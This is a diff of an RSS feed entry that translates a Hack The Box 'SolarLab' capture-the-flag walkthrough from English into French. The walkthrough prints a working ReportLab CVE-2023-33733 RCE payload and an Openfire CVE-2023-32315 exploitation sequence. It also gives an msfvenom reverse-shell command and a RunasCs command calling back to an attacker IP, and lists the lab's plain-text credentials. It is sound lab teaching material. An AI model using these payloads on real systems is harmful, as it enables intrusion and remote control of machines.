@@ -15,7 +15,7 @@
             <pubDate>Fri, 20 Sep 2024 13:33:36 -0500</pubDate>
             
             <guid>https://scorpiosec.com/fr/posts/2024/09/htb-solarlab/</guid>
-            <description>Platforme: Hack The Box Lien: SolarLab Niveau: Moyen OS: Windows SolarLab débute par un site web de base qui, après énumération, n&amp;rsquo;offre aucune voie d&amp;rsquo;exploitation directe. En se concentrant sur SMB, nous découvrons un document dans un partage de fichiers contenant des informations d&amp;rsquo;identification. Ces identifiants permettent d&amp;rsquo;accéder à ReportHub, accessible à partir d&amp;rsquo;un sous-domaine trouvé lors de l&amp;rsquo;énumération précédente. En examinant ses fonctionnalités, nous identifions qu&amp;rsquo;il génère des PDF en utilisant la bibliothèque ReportLab vulnérable (CVE-2023-33733), ce qui nous permet d&amp;rsquo;exploiter cela et d&amp;rsquo;obtenir un accès initial, en récupérant le drapeau de l&amp;rsquo;utilisateur.</description>
+            <description>Platforme: Hack The Box Lien: SolarLab Niveau: Moyen OS: Windows SolarLab commence par un site web qui n&amp;rsquo;offre aucune voie d&amp;rsquo;exploitation directe. Après avoir énuméré SMB, nous découvrons des informations d&amp;rsquo;identification dans un partage de fichiers. Ces identifiants permettent d&amp;rsquo;accéder à ReportHub, accessible par le biais d&amp;rsquo;un sous-domaine découvert lors du balayage. En examinant ses fonctionnalités, nous identifions qu&amp;rsquo;il génère des PDF en utilisant la bibliothèque ReportLab vulnérable au CVE-2023-33733.</description>
             <content type="html"><![CDATA[<ul>
 <li>Platforme: Hack The Box</li>
 <li>Lien: <a href="https://app.hackthebox.com/machines/SolarLab" target="_blank" >SolarLab</a>
@@ -25,12 +25,12 @@
 <li>OS: Windows</li>
 </ul>
 <hr>
-<p>SolarLab débute par un site web de base qui, après énumération, n&rsquo;offre aucune voie d&rsquo;exploitation directe. En se concentrant sur SMB, nous découvrons un document dans un partage de fichiers contenant des informations d&rsquo;identification. Ces identifiants permettent d&rsquo;accéder à ReportHub, accessible à partir d&rsquo;un sous-domaine trouvé lors de l&rsquo;énumération précédente. En examinant ses fonctionnalités, nous identifions qu&rsquo;il génère des PDF en utilisant la bibliothèque ReportLab vulnérable (CVE-2023-33733), ce qui nous permet d&rsquo;exploiter cela et d&rsquo;obtenir un accès initial, en récupérant le drapeau de l&rsquo;utilisateur.</p>
-<p>Une exploration plus poussée révèle plusieurs services internes, y compris une console d&rsquo;administration Openfire accessible via un tunnel. En exploitant une vulnérabilité connue dans la version d&rsquo;Openfire (CVE-2023-32315), nous accédons à la console d&rsquo;administration et élevons les privilèges en téléchargeant un plugin malveillant couplé à une commande shell inversée. Enfin, en décryptant les informations d&rsquo;identification trouvées dans un fichier Openfire, nous obtenons un shell d&rsquo;administration et récupérons le drapeau root.</p>
+<p>SolarLab commence par un site web qui n&rsquo;offre aucune voie d&rsquo;exploitation directe. Après avoir énuméré SMB, nous découvrons des informations d&rsquo;identification dans un partage de fichiers. Ces identifiants permettent d&rsquo;accéder à ReportHub, accessible par le biais d&rsquo;un sous-domaine découvert lors du balayage. En examinant ses fonctionnalités, nous identifions qu&rsquo;il génère des PDF en utilisant la bibliothèque ReportLab vulnérable au CVE-2023-33733. Grâce à cette vulnérabilité, nous obtenons notre accès initial et trouvons le drapeau utilisateur.</p>
+<p>Une exploration plus poussée révèle plusieurs services internes, y compris une console d&rsquo;administration Openfire accessible via un tunnel. Le logiciel est obsolète, ce qui nous permet d&rsquo;exploiter le CVE-2023-32315 pour obtenir un autre shell avec plus de privilèges. Enfin, en décryptant les informations d&rsquo;identification trouvées dans un fichier Openfire, nous obtenons un shell d&rsquo;administration et récupérons le drapeau root.</p>
 <p>Addresse IP cibe - <code>10.10.11.16</code></p>
-<h2 id="scanning">Scanning</h2>
+<h2 id="balayage">Balayage</h2>
 <pre tabindex="0"><code>nmap -sC -sV -oA nmap/SolarLab -p- 10.10.11.16
-</code></pre><p><strong>Results</strong></p>
+</code></pre><p><strong>Résultats</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-09-20 13:32 CDT
 </span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.16
 </span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.052s latency<span style="color:#f92672">)</span>.
@@ -57,23 +57,23 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 176.37 seconds
-</span></span></code></pre></div><p>Ports discovered:</p>
+</span></span></code></pre></div><p>Ports découverts :</p>
 <ul>
-<li>80 - HTTP with Nginx 1.24.0 redirecting to <code>http://solarlab.htb/</code></li>
+<li>80 - HTTP avec Nginx 1.24.0 redirigeant vers <code>http://solarlab.htb/</code></li>
 <li>135 - RPC</li>
 <li>139 (NetBIOS) &amp; 445 (SMB)</li>
-<li>6791 - HTTP with nginx with a second redirection to <code>http://report.solarlab.htb:6791/</code></li>
+<li>6791 - HTTP avec nginx avec une seconde redirection vers <code>http://report.solarlab.htb:6791/</code></li>
 </ul>
-<p>We update the hosts file.</p>
+<p>Mettons à jour le fichier hosts.</p>
 <pre tabindex="0"><code>sudo echo &#34;10.10.11.16 solarlab.htb report.solarlab.htb&#34; | sudo tee -a /etc/hosts
-</code></pre><h2 id="enumeration">Enumeration</h2>
-<p>The website features a messaging service that is supposed to be &ldquo;unhackable&rdquo;.</p>
+</code></pre><h2 id="enumération">Enumération</h2>
+<p>Le site web propose un service de messagerie censé être &ldquo;inviolable&rdquo;.</p>
 <p><img src="/images/HTB-SolarLab/solarlab-website.png" alt="SolarLab website"></p>
-<p>The source code of the webpage doesn&rsquo;t reveal anything useful.</p>
-<p>After enumerating SMB we find that we can read the <code>Documents</code> share.</p>
+<p>Le code source de la page web ne révèle rien d&rsquo;utile.</p>
+<p>Après avoir énuméré SMB, nous constatons que nous pouvons lire le partage <code>Documents</code>.</p>
 <pre tabindex="0"><code>netexec smb 10.10.11.16 -u Guest -p &#34;&#34; --shares
 </code></pre><p><img src="/images/HTB-SolarLab/smb_enum.png" alt="SolarLab shares enumeration"></p>
-<p>We use smbclient to access the share and find four files, two right after accessing the share and two additional files in the <code>concepts</code> directory:</p>
+<p>Nous utilisons smbclient pour accéder au partage et trouvons quatre fichiers, deux juste après avoir accédé au partage et deux fichiers supplémentaires dans le répertoire <code>concepts</code>:</p>
 <ul>
 <li><code>details-file.xlsx</code></li>
 <li><code>old_leave_request_form.docx</code></li>
@@ -82,112 +82,111 @@
 </ul>
 <pre tabindex="0"><code>smbclient //10.10.11.16/Documents -U Guest
 </code></pre><p><img src="/images/HTB-SolarLab/share_files.png" alt="SolarLab shares files"></p>
-<p>We can download all the files with <code>get</code>.</p>
+<p>Nous pouvons télécharger tous les fichiers avec <code>get</code>.</p>
 <p><img src="/images/HTB-SolarLab/files-downloads.png" alt="SolarLab shares files download"></p>
-<p>After examining each document we find some credentials in <code>details-file.xlsx</code>.</p>
+<p>Après avoir examiné chaque document, nous trouvons des informations d&rsquo;identification dans le fichier <code>details-file.xlsx</code>.</p>
 <p><img src="/images/HTB-SolarLab/password-file.png" alt="Credentials found"></p>
-<p>So far the only way we can use those credentials is with SMB. It turns out that those credentials are valid but the available shares are still the same ones we could access with the guest account.</p>
+<p>Jusque-là, la seule façon d&rsquo;utiliser ces informations d&rsquo;identification est d&rsquo;utiliser le protocole SMB. Il s&rsquo;avère que ces informations d&rsquo;identification sont valides mais les partages disponibles sont toujours les mêmes que ceux auxquels nous pouvions accéder avec le compte guest.</p>
 <pre tabindex="0"><code>netexec smb 10.10.11.16 -u KAlexander -p &#34;dkjafblkjadsfgl&#34;
 
 netexec smb 10.10.11.16 -u blake -p &#34;ThisCanB3typedeasily1@&#34;
 
 netexec smb 10.10.11.16 -u ClaudiaS -p &#34;dadsfawe9dafkn&#34;
 </code></pre><p><img src="/images/HTB-SolarLab/smb_logins.png" alt="SMB logins"></p>
-<p>Moving on, directory enumeration is also unfruitful.</p>
+<p>L&rsquo;énumération des répertoires est également infructueuse.</p>
 <pre tabindex="0"><code>gobuster dir -u http://solarlab.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 </code></pre><p><img src="/images/HTB-SolarLab/gobuster.png" alt="SolarLab directory bruteforcing"></p>
-<p>Let&rsquo;s check the second subdomain. When we go to <code>http://report.solarlab.htb:6791/</code> we find a login form for ReportHub.</p>
+<p>Examinons le deuxième sous-domaine. Lorsque nous allons sur <code>http://report.solarlab.htb:6791/</code>, nous trouvons un formulaire de connexion pour ReportHub.</p>
 <p><img src="/images/HTB-SolarLab/reporthub_solarlab.png" alt="SolarLab report subdomain"></p>
-<p>The only credentials we have so far are the ones from the password file, after several tries we are able to login with <code>blakeb:ThisCanB3typedeasily1@</code>.</p>
+<p>Les seules informations d&rsquo;identification dont nous disposons jusqu&rsquo;à présent sont celles du fichier de mots de passe. Après plusieurs tentatives, nous parvenons à nous connecter avec <code>blakeb:ThisCanB3typedeasily1@</code>.</p>
 <p><img src="/images/HTB-SolarLab/dashboard.png" alt="SolarLab Dashboard"></p>
-<p>We can choose which option we want, fill the form and get a pdf file. We can also upload a picture for the signature (which might be a way to exploit the target).</p>
+<p>Nous pouvons choisir l&rsquo;option souhaitée, remplir le formulaire et obtenir un fichier pdf. Nous pouvons également télécharger une image pour la signature (ce qui pourrait être un moyen d&rsquo;exploiter la cible).</p>
 <p><img src="/images/HTB-SolarLab/Leave-Request-form.png" alt="Leave request form"></p>
-<p>Below is an example of the PDF generated.</p>
+<p>Voici un exemple du PDF généré.</p>
 <p><img src="/images/HTB-SolarLab/pdf-generated.png" alt="pdf generated"></p>
-<h2 id="initial-foothold">Initial Foothold</h2>
-<p>Using exiftool on the PDF generated we discover that it is produced by reportlab.</p>
+<h2 id="accès-initial">Accès Initial</h2>
+<p>En utilisant exiftool sur le PDF généré, nous découvrons qu&rsquo;il est produit par reportlab.</p>
 <pre tabindex="0"><code>exiftool output.pdf
 </code></pre><p><img src="/images/HTB-SolarLab/output_pdf.png" alt="exiftool results"></p>
-<p>We find a PoC for Reportlab (<a href="https://ethicalhacking.uk/cve-2023-33733-rce-in-reportlabs-html-parser/#gsc.tab=0" target="_blank" >CVE-2023-33733</a>
+<p>Nous trouvons un PoC pour Reportlab (<a href="https://ethicalhacking.uk/cve-2023-33733-rce-in-reportlabs-html-parser/#gsc.tab=0" target="_blank" >CVE-2023-33733</a>
 
-) that leads to RCE <a href="https://github.com/c53elyas/CVE-2023-33733/tree/master" target="_blank" >here</a>
+) qui mène à un RCE <a href="https://github.com/c53elyas/CVE-2023-33733/tree/master" target="_blank" >ici</a>
 
 .</p>
 <blockquote>
-<p>I used the <code>Travel Approval</code> option here but you can make the exploit work with the other options.</p>
+<p>J&rsquo;utilise ici l&rsquo;option <code>Travel Approval</code> mais vous pouvez faire fonctionner l&rsquo;exploit avec les autres options.</p>
 </blockquote>
 <p><img src="/images/HTB-SolarLab/Travel_Approval.png" alt="Travel Approval"></p>
-<p>After catching the request and sending it to the repeater with Burp. We insert our payload and make sure to match the <code>filename</code> value with the one for <code>Content-Type</code>.</p>
+<p>Après avoir capturé la requête et l&rsquo;avoir envoyée au repeater avec Burp, nous insérons notre payload et nous nous assurons que la valeur <code>filename</code> correspond à celle de <code>Content-Type</code>.</p>
 <blockquote>
-<p>We get a reverse shell from <a href="https://www.revshells.com/" target="_blank" >revshells</a>
+<p>Nous obtenons un shell inversé sur <a href="https://www.revshells.com/" target="_blank" >revshells</a>
 
- using the option <code>PowerShell #3 (Base64)</code>.</p>
+ en utilisant l&rsquo;option <code>PowerShell #3 (Base64)</code>.</p>
 </blockquote>
 <p><img src="/images/HTB-SolarLab/payload-RCE.png" alt="ReportLab RCE"></p>
-<p><strong>Payload used</strong></p>
+<p><strong>Payload utilisé</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span>&lt;<span style="color:#f92672">para</span>&gt;&lt;<span style="color:#f92672">font</span> <span style="color:#a6e22e">color</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[[[getattr(pow, Word(&#39;__globals__&#39;))[&#39;os&#39;].system(&#39;INSERT_REVSHELL_HERE&#39;) for Word in [ orgTypeFun( &#39;Word&#39;, (str,), { &#39;mutated&#39;: 1, &#39;startswith&#39;: lambda self, x: 1 == 0, &#39;__eq__&#39;: lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#39;mutate&#39;: lambda self: { setattr(self, &#39;mutated&#39;, self.mutated - 1) }, &#39;__hash__&#39;: lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and &#39;red&#39;&#34;</span>&gt;
 </span></span><span style="display:flex;"><span>                exploit
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">font</span>&gt;&lt;/<span style="color:#f92672">para</span>&gt;
-</span></span></code></pre></div><p>On our listener we get a shell as Blake and the user flag is found in the Desktop directory.</p>
+</span></span></code></pre></div><p>Sur notre listener, nous obtenons un shell en tant que Blake et le drapeau utilisateur se trouve dans le répertoire Desktop.</p>
 <p><img src="/images/HTB-SolarLab/user_flag.png" alt="User flag"></p>
-<h3 id="shell-as-openfire">Shell as openfire</h3>
-<p>There is a <code>openfire</code> user on the target.</p>
+<h3 id="shell-openfire">Shell openfire</h3>
+<p>Nous constatons la présence d&rsquo;un autre utilisateur <code>openfire</code> sur la cible .</p>
 <p><img src="/images/HTB-SolarLab/users_list.png" alt="User list"></p>
-<p>With <code>netstat -ano</code> we check all the services running on the target. In order to access the internal services we use tunneling.</p>
+<p>Avec <code>netstat -ano</code> nous obtenons tous les services fonctionnant sur la cible. Pour accéder aux services internes, nous utilisons le tunneling.</p>
 <blockquote>
-<p>I personally prefer <a href="https://github.com/nicocha30/ligolo-ng" target="_blank" >ligolo-ng</a>
+<p>Personnellement, je préfère <a href="https://github.com/nicocha30/ligolo-ng" target="_blank" >ligolo-ng</a>
 
- but you can also use chisel.</p>
+, mais vous pouvez également utiliser <a href="https://github.com/jpillora/chisel" target="_blank" >chisel</a>
+
+.</p>
 </blockquote>
 <p><img src="/images/HTB-SolarLab/netstat.png" alt="netstat command"></p>
-<p>After trying various ports we find an Openfire Administration Console on port 9090.</p>
+<p>Après avoir essayé plusieurs ports, nous trouvons une console d&rsquo;administration Openfire sur le port 9090.</p>
 <p><img src="/images/HTB-SolarLab/Openfire-console.png" alt="Openfire admin console"></p>
-<p>This is the admin console, no credentials we have so far are working. I remember this version of Openfire being vulnerable to <a href="https://vulncheck.com/blog/openfire-cve-2023-32315" target="_blank" >CVE-2023-32315</a>
+<p>Aucune des informations d&rsquo;identification dont nous disposons ne fonctionne. Je reconnais cette version obsolète d&rsquo;Openfire, elle est vulnérable au <a href="https://vulncheck.com/blog/openfire-cve-2023-32315" target="_blank" >CVE-2023-32315</a>
 
- with a PoC being available <a href="https://github.com/miko550/CVE-2023-32315" target="_blank" >here</a>
+ avec un PoC disponible <a href="https://github.com/miko550/CVE-2023-32315" target="_blank" >ici</a>
 
 .</p>
 <blockquote>
-<p>This exploitation method was used for HTB: Jab, but we already had credentials back then</p>
+<p>La méthode d&rsquo;exploitation est la même pour HTB: Jab, mais nous avions déjà les identifiants pour nous connecter à la console.</p>
 </blockquote>
 <ol>
-<li>We login with the newly created account</li>
+<li>Nous nous connectons avec le compte nouvellement créé</li>
 </ol>
 <pre tabindex="0"><code>python3 CVE-2023-32315.py -t http://240.0.0.1:9090
 </code></pre><p><img src="/images/HTB-SolarLab/openfire-new-account.png" alt="Openfire new account"></p>
-<p>Once logged in we need to upload a malicious plugin in the <code>Plugin</code> section. The malicious plugin is the <code>openfire-management-tool-plugin.jar</code> file available in the PoC repository.</p>
+<p>Une fois connecté, nous devons télécharger un plugin malveillant dans la section <code>Plugin</code>. Le plugin malveillant est le fichier <code>openfire-management-tool-plugin.jar</code> disponible sur le repo du PoC sur Github.</p>
 <p><img src="/images/HTB-SolarLab/malicious-plugin.png" alt="Openfire malicious plugin"></p>
-<p>Go to <code>Server</code> &ndash;&gt; <code>Server Settings</code> &ndash;&gt; <code>Management Tool</code>, input the password <code>123</code> and click <code>Login</code>. You get some information about the server.</p>
-<p>Select <code>system command</code> in the drop-down menu.</p>
+<p>Allez dans <code>Server</code> &ndash;&gt; <code>Server Settings</code> &ndash;&gt; <code>Management Tool</code>, entrez le mot de passe <code>123</code> et cliquez sur <code>Login</code>. Vous obtenez des informations sur le serveur.</p>
+<p>Sélectionnez <code>system command</code> dans le menu déroulant.</p>
 <p><img src="/images/HTB-SolarLab/system_cmd.png" alt="Openfire system command"></p>
-<p>Get another Powershell base64 encoded reverse shell from <a href="https://www.revshells.com/" target="_blank" >revshells</a>
+<p>De retour sur <a href="https://www.revshells.com/" target="_blank" >revshells</a>
 
- and execute it. On the listener we get a shell as <code>openfire</code>.</p>
+ nous obtenons un autre shell inversé Powershell et après l&rsquo;avoir exécuté, nous obtenons un shell en tant que <code>openfire</code>.</p>
 <p><img src="/images/HTB-SolarLab/execute-cmd.png" alt="Openfire execute command"></p>
 <p><img src="/images/HTB-SolarLab/openfire_shell.png" alt="Openfire shell"></p>
-<h2 id="privilege-escation-admin-shell">Privilege Escation (admin shell)</h2>
-<p>We still cannot find the root flag but after some system exploration we find a file called <code>openfire.script</code> in <code>C:\Program Files\Openfire\embedded-db</code>.</p>
-<p>The file contains the credentials of the admin user but the password needs to be decrypted. Forunately we have the password hash and the key.</p>
+<h2 id="elévation-de-privilèges-shell-admin">Elévation de Privilèges (shell admin)</h2>
+<p>Nous n&rsquo;avons toujours pas accès au compte administrateur, mais après une exploration du système, nous trouvons un fichier appelé <code>openfire.script</code> dans <code>C:\Program Files\Openfire\embedded-db</code>.</p>
+<p>Le fichier contient les informations d&rsquo;identification de l&rsquo;utilisateur admin mais le mot de passe doit être décrypté. Heureusement, nous avons le hachage du mot de passe et la clé.</p>
 <p><img src="/images/HTB-SolarLab/encrypted-pwd.png" alt="Openfire encrypted password"></p>
 <ul>
 <li>Password hash: <code>becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442</code></li>
 <li>Key value: <code>hGXiFzsKaAeYLjn</code></li>
 </ul>
-<p>We can decrypt those with <a href="https://github.com/c0rdis/openfire_decrypt" target="_blank" >openfire_decrypt</a>
+<p>Nous pouvons décrypter le mot de passe avec <a href="https://github.com/c0rdis/openfire_decrypt" target="_blank" >openfire_decrypt</a>
 
  by using the command below.</p>
 <pre tabindex="0"><code>java OpenFireDecryptPass [PASSWORD_HASH] [KEY_VALUE]
 </code></pre><p><img src="/images/HTB-SolarLab/java-openfire-decrypt.png" alt="Openfire password decrytion"></p>
-<p>The credentials are: <code>admin:ThisPasswordShouldDo!@</code>.</p>
-<p>I tried to login with Evil-WinRM but it was not working so we resort to using RunasCs.</p>
+<p>Les identifiants de l&rsquo;administrateur sont: <code>admin:ThisPasswordShouldDo!@</code></p>
+<p>Les tentatives de connexion avec Evil-WinRM ne fonctionnant pas, nous avons recours à RunasCs.</p>
 <pre tabindex="0"><code>msfvenom -p windows/x64/shell_reverse_tcp lhost=YOUR_IP lport=PORT_NUMBER -f exe -a x64 --platform windows -o shell.exe
-</code></pre><p>After sending both <code>shell.exe</code> and <code>RunasCs.exe</code> to the target, we run the command below.</p>
-<blockquote>
-<p>Setup a listener before running the runascs.exe command</p>
-</blockquote>
+</code></pre><p>Après avoir envoyé <code>shell.exe</code> et <code>RunasCs.exe</code> à la cible, nous exécutons la commande ci-dessous.</p>
 <pre tabindex="0"><code>.\runascs.exe administrator ThisPasswordShouldDo!@ powershell -r 10.10.14.176:5555
 </code></pre><p><img src="/images/HTB-SolarLab/runascs_root.png" alt="runascs root command"></p>
-<p>On our listener we get a shell as administrator and we find the root flag in the Desktop directory.</p>
+<p>Nous obtenons un shell en tant qu&rsquo;administrateur et nous pouvons lire le drapeau root dans le répertoire Desktop.</p>
 <p><img src="/images/HTB-SolarLab/root_flag.png" alt="root shell &amp; root flag"></p>
 ]]></content>
         </item>
